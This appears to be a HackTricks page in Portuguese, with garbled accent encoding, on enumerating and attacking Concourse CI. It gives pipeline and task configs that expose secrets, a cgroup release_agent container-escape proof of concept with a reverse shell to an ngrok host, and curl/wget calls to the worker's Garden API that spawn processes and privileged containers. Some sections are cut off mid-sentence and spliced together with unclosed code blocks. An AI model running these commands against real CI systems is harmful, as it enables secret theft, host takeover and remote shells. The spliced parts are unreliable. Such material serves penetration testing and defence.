# Enumera√ß√£o e Ataques ao Concourse

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Fun√ß√µes e Permiss√µes de Usu√°rio

O Concourse vem com cinco fun√ß√µes:

* _Concourse_ **Admin**: Esta fun√ß√£o √© dada apenas aos propriet√°rios da **equipe principal** (equipe inicial padr√£o do Concourse). Os administradores podem **configurar outras equipes** (por exemplo: `fly set-team`, `fly destroy-team`...). As permiss√µes desta fun√ß√£o n√£o podem ser afetadas pelo RBAC.
* **owner**: Os propriet√°rios da equipe podem **modificar tudo dentro da equipe**.
* **member**: Os membros da equipe podem **ler e escrever** dentro dos **ativos da equipe**, mas n√£o podem modificar as configura√ß√µes da equipe.
* **pipeline-operator**: Os operadores de pipeline podem executar **opera√ß√µes de pipeline** como acionar builds e fixar recursos, no entanto, eles n√£o podem atualizar as configura√ß√µes do pipeline.
* **viewer**: Os visualizadores da equipe t√™m acesso **"somente leitura" a uma equipe** e seus pipelines.

{% hint style="info" %}
Al√©m disso, as **permiss√µes das fun√ß√µes owner, member, pipeline-operator e viewer podem ser modificadas** configurando o RBAC (configurando mais especificamente suas a√ß√µes). Leia mais sobre isso em: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Observe que o Concourse **agrupa pipelines dentro de equipes**. Portanto, os usu√°rios pertencentes a uma equipe poder√£o gerenciar esses pipelines e **v√°rias equipes** podem existir. Um usu√°rio pode pertencer a v√°rias equipes e ter permiss√µes diferentes dentro de cada uma delas.

## Vars e Gerenciador de Credenciais

Nos arquivos YAML, voc√™ pode configurar valores usando a sintaxe `((`_`nome-da-fonte`_`:`_`caminho-secreto`_`.`_`campo-secreto`_`))`.\
O **nome da fonte √© opcional**, e se omitido, o [gerenciador de credenciais em todo o cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) ser√° usado, ou o valor pode ser fornecido [estaticamente](https://concourse-ci.org/vars.html#static-vars).\
O **campo-secreto opcional** especifica um campo no segredo recuperado para leitura. Se omitido, o gerenciador de credenciais pode optar por ler um 'campo padr√£o' do credencial recuperado se o campo existir.\
Al√©m disso, o _**caminho-secreto**_ e o _**campo-secreto**_ podem ser cercados por aspas duplas `"..."` se eles **contiverem caracteres especiais** como `.` e `:`. Por exemplo, `((fonte:"meu.segredo"."campo:1"))` definir√° o _caminho-secreto_ como `meu.segredo` e o _campo-secreto_ como `campo:1`.

### Vars Est√°ticas

Vars est√°ticas podem ser especificadas em **etapas de tarefas**:

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Ou usando os seguintes **argumentos fly**:

* `-v` ou `--var` `NOME=VALOR` define a string `VALOR` como o valor para a var `NOME`.
* `-y` ou `--yaml-var` `NOME=VALOR` analisa `VALOR` como YAML e o define como o valor para a var `NOME`.
* `-i` ou `--instance-var` `NOME=VALOR` analisa `VALOR` como YAML e o define como o valor para a var de inst√¢ncia `NOME`. Consulte [Agrupando pipelines](https://concourse-ci.org/instanced-pipelines.html) para saber mais sobre vars de inst√¢ncia.
* `-l` ou `--load-vars-from` `ARQUIVO` carrega `ARQUIVO`, um documento YAML contendo mapeamento de nomes de var para valores, e os define todos.

### Gerenciamento de Credenciais

Existem diferentes maneiras de **especificar um Gerenciador de Credenciais** em um pipeline, leia como em [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Al√©m disso, o Concourse suporta diferentes gerenciadores de credenciais:

* [O gerenciador de credenciais Vault](https://concourse-ci.org/vault-credential-manager.html)
* [O gerenciador de credenciais CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [O gerenciador de credenciais AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [O gerenciador de credenciais AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Gerenciador de Credenciais Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [O gerenciador de credenciais Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching de credenciais](https://concourse-ci.org/creds-caching.html)
* [Reda√ß√£o de credenciais](https://concourse-ci.org/creds-redacting.html)
* [Tentativas de busca com falha](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Observe que se voc√™ tiver algum tipo de **acesso de grava√ß√£o ao Concourse**, poder√° criar trabalhos para **exfiltrar esses segredos** porque o Concourse precisa ser capaz de acess√°-los.
{% endhint %}

## Enumera√ß√£o do Concourse

Para enumerar um ambiente Concourse, voc√™ primeiro precisa **obter credenciais v√°lidas** ou encontrar um **token autenticado** provavelmente em um arquivo de configura√ß√£o `.flyrc`.

### Login e enumera√ß√£o do usu√°rio atual

* Para fazer login, voc√™ precisa saber o **endpoint**, o **nome da equipe** (o padr√£o √© `main`) e uma **equipe √† qual o
### Cria√ß√£o/Modifica√ß√£o de Pipeline

Se voc√™ tiver privil√©gios suficientes (**fun√ß√£o de membro ou superior**), voc√™ poder√° **criar/modificar novos pipelines**. Verifique este exemplo:

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

Com a **modifica√ß√£o/cria√ß√£o** de um novo pipeline, voc√™ poder√°:

* **Roubar** os **segredos** (por meio de eco√°-los ou entrando no cont√™iner e executando `env`)
* **Escapar** para o **n√≥** (dando a voc√™ privil√©gios suficientes - `privileged: true`)
* Enumerar/Abusar do endpoint de **metadados da nuvem** (do pod e do n√≥)
* **Excluir** o pipeline criado

### Executar Tarefa Personalizada

Isso √© semelhante ao m√©todo anterior, mas em vez de modificar/criar um novo pipeline, voc√™ pode **apenas executar uma tarefa personalizada** (que provavelmente ser√° muito mais **furtiva**):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escapando para o n√≥ a partir de uma tarefa privilegiada

Nas se√ß√µes anteriores, vimos como **executar uma tarefa privilegiada com o Concourse**. Isso n√£o dar√° ao cont√™iner exatamente o mesmo acesso que a sinaliza√ß√£o privilegiada em um cont√™iner docker. Por exemplo, voc√™ n√£o ver√° o dispositivo do sistema de arquivos do n√≥ em /dev, ent√£o a fuga pode ser mais "complexa".

No seguinte PoC, vamos usar o release\_agent para escapar com algumas pequenas modifica√ß√µes:

```bash
# Monta o controlador cgroup RDMA e cria um cgroup filho
# Se voc√™ estiver seguindo e receber "mount: /tmp/cgrp: dispositivo especial cgroup n√£o existe"
# √â porque sua configura√ß√£o n√£o tem o controlador cgroup de mem√≥ria, tente mudar a mem√≥ria para rdma para corrigir
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Habilita notifica√ß√µes cgroup na libera√ß√£o do cgroup "x"
echo 1 > /tmp/cgrp/x/notify_on_release


# ALTERE-ME
# O caminho do host parecer√° o seguinte, mas voc√™ precisa alter√°-lo:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## O caminho inicial "/mnt/vda1" √© provavelmente o mesmo, mas voc√™ pode verific√°-lo usando o comando mount:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## A pr√≥xima parte acho que √© constante "hostpath-provisioner/default/"

## Para a pr√≥xima parte "concourse-work-dir-concourse-release-worker-0" voc√™ precisa saber como √© constru√≠da
# "concourse-work-dir" √© constante
# "concourse-release" √© o prefixo do consourse do ambiente consourse atual (voc√™ precisa encontr√°-lo na API)
# "worker-0" √© o nome do trabalhador em que o cont√™iner est√° sendo executado (geralmente ser√° esse ou incrementando o n√∫mero)

## A parte final "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" √© meio constante
# executando `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` voc√™ ver√° algo como:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# o UID √© a parte que estamos procurando

# Ent√£o o host_path √©:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Define release_agent para /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Shell reverso
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Obter sa√≠da
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executa o ataque gerando um processo que termina imediatamente dentro do cgroup filho "x"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# L√™ a sa√≠da
cat /output
```

{% hint style="warning" %}
Como voc√™ pode ter notado, isso √© apenas uma [**fuga regular do release\_agent**](broken-reference) apenas modificando o caminho do cmd no n√≥
{% endhint %}

### Escapando para o n√≥ a partir de um cont√™iner de trabalhador

Uma fuga regular do release\_agent com uma pequena modifica√ß√£o √© suficiente para isso:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
#### Entrando em um container privilegiado em execu√ß√£o

```bash
# Obter o container atual
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Obter informa√ß√µes do container
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Executar um novo processo dentro de um container
## Neste caso, "sleep 20000" ser√° executado no container com o handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# OU em vez de fazer tudo isso, voc√™ pode simplesmente entrar no ns do processo do container privilegiado
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Criando um novo container privilegiado

Voc√™ pode criar facilmente um novo container (apenas executando um UID aleat√≥rio) e executar algo nele:

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# O wget ficar√° preso l√° enquanto o processo estiver sendo executado
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

No entanto, o servidor web est√° verificando a cada poucos segundos os containers em execu√ß√£o e, se um inesperado for descoberto, ele ser√° exclu√≠do. Como a comunica√ß√£o est√° ocorrendo em HTTP, voc√™ pode manipular a comunica√ß√£o para evitar a exclus√£o de containers inesperados:

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>